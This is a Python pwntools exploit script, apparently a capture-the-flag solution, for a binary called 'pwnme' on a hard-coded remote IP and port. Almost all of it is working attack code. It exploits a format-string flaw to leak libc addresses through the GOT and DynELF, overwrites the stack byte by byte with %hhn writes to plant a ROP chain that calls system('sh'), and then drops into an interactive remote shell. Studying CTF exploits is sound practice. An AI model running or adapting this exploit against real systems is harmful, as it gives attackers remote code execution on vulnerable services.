#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from __future__ import absolute_import, with_statement, print_function
import sys
if sys.version < 3:
    range = xrange
from pwn import *

"""
nc 106.75.66.195 13002
"""

context.log_level = 'info'

class Config:
    exe = './pwnme'
    elf = ELF(exe)
    pop_rdi_ret = 0x400ed3  #: pop rdi; ret;

class Remote(Config):
    host = '106.75.66.195'
    port = 13002
    
    def __init__(self):
        self.io = remote(Remote.host, Remote.port)


class Local(Config):
    host = '127.0.0.1'
    port = 4444

    def __init__(self):
        # self.io = process(Config.exe)
        self.io = remote(Local.host, Local.port)


class Exploit:
    io = None
    rv = None
    ru = None
    sa = None
    sl = None

    @staticmethod
    def set_io(io):
        e = Exploit
        e.io = io
        e.rv = io.recv
        e.ru = io.recvuntil
        e.sa = io.sendafter
        e.sl = io.sendlineafter

    @staticmethod
    def leak(address):
        e = Exploit
        va = address
        buf = []
        while 1:
            e.sl('System:\n>', '2')
            e.sa('lenth:20): \n', '%11$s')
            e.sa('lenth:20): \n', '\x00' * 4 + p64(va))
            e.sl('3.QUit System:\n>', '1')
            r = e.ru('1.Sh0w Account')[:-14]
            if len(r) > 0:
                buf.extend(r)
            else:
                buf.append('\x00')
            l = len(buf)
            if l >= 8:
                break
            else:
                va = address + l
        return ''.join(buf[:8])

    @staticmethod
    def leak_func_addr(func_name):
        e = Exploit
        c = Config
        func_got = c.elf.got[func_name]
        func_addr = u64(e.leak(func_got))
        return func_addr

    @staticmethod
    def write_byte(addr, b):
        e = Exploit
        assert len(b) == 1
        data = ord(b)
        if data == 0:
            data = 256
        assert 0 < data <= 256
        log.info('write %s to %s', hex(data % 0x100), hex(addr))
        e.sl('System:\n>', '2')
        sleep(0.05)
        e.sa('lenth:20): \n', '%{}c%11$hhn'.format(data))
        sleep(0.05)
        e.sa('lenth:20): \n', 'a' * 4 + p64(addr))
        sleep(0.05)
        e.sl('3.QUit System:\n>', '1')


def to_pwn(libc_system, libc_start_main, binsh):
    e = Exploit
    c = Config
    # payload = p64(c.pop_rdi_ret) + p64(binsh) + p64(libc_system)
    # 非常诡异。为什么上面的形式不行？！
    # payload = p64(c.pop_rdi_ret) + p64(libc_start_main + 24) + p64(libc_system) + '/bin/sh\x00'
    payload = p64(c.pop_rdi_ret) + p64(libc_start_main + 24) + \
        p64(libc_system) + 'sh\x00'  # 由于出现过flush，直接使用sh也是可以的
    pwn_addr = libc_start_main
    for i, b in enumerate(payload):
        e.write_byte(pwn_addr + i, b)
    e.sl('>', '3')  # Quit


def stage1():
    e = Exploit
    c = Config
    # 第一次连接，使用DynELF获取system地址，并计算差值
    io = Local().io if len(sys.argv) == 1 else Remote().io
    e.set_io(io)
    # init
    e.sl('username(max lenth:40): \n', 'whatever')
    e.sl('password(max lenth:40): \n', 'whatevertoo')
    e.ru('Register Success!!')

    libc_read = e.leak_func_addr('read')
    log.success('1. libc_read = %s', hex(libc_read))
    # DynELF
    d = DynELF(e.leak, elf=c.elf)
    libc_system = d.lookup('system', 'libc')
    log.success('1. libc_system = %s', hex(libc_system))
    io.close()
    delta = libc_read - libc_system
    log.success('1. delta = %s', delta)
    return delta

def stage2(delta):
    e = Exploit
    # 第二次连接，开始pwn delta = 686000
    io = Local().io if len(sys.argv) == 1 else Remote().io
    e.set_io(io)
    # init 获取栈地址
    e.sl('username(max lenth:40): \n', '%14$lx#')  # 泄漏 __libc_start_main 地址（其实并不是这个函数）
    e.sa('password(max lenth:40): \n', '\x00' * 12 + '/bin/sh\x00')  # 这里写入似乎没用

    e.sl('System:\n>', '1')
    a = e.ru('1.Sh0w Account Infomation!')
    a = a.split('#')
    libc_start_main = int(a[0], 16) + 8
    password2_addr = libc_start_main - (0x7ffe8d6c6218 - 0x7ffe8d6c61d0)
    libc_read = e.leak_func_addr('read')

    log.success('2. libc_start_main = %s', hex(libc_start_main))
    log.success('2. binsh_addr = %s', hex(password2_addr))
    log.success('2. libc_read = %s', hex(libc_read))

    libc_system = libc_read - delta
    log.success('2. libc_system = %s', hex(libc_system))
    
    # raw_input('w')
    # to pwn
    to_pwn(libc_system, libc_start_main, password2_addr)
    io.interactive()
    io.close()


def main():
    if len(sys.argv) == 1:
        # stage2(stage1())
        stage2(678720)
    else:
        stage2(686000)


if __name__ == '__main__':
    main()
